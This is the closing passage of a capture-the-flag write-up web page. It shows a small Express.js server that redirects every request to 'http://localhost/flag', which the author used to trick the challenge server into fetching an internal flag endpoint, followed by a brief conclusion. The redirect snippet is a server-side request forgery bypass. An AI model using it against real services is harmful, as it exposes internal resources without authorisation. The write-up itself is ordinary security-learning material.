+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">&quot;http://localhost/flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre></div><p>Using the URL <code>http://&lt;myip&gt;/</code> works and gets me the flag printed. Ah, that's better.</p> <h2 id="conclusion"><a href="#conclusion" class="header-anchor">#</a> Conclusion</h2> <p>This challenge had a satisying trick to it, so I enjoyed it. Unfortunately, I did not take any pictures, and I only have my python bruteforce script, so this writeup is quite bland. Later on, it was revealed that it was copied from another challenge with added restrictions ._., so I was a bit disappointed.</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> <!----></main></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.c3d8ca62.js" defer></script><script src="/assets/js/6.3722ae10.js" defer></script><script src="/assets/js/3.8eed2eee.js" defer></script><script src="/assets/js/19.9ea997bf.js" defer></script>
+  </body>
+</html>
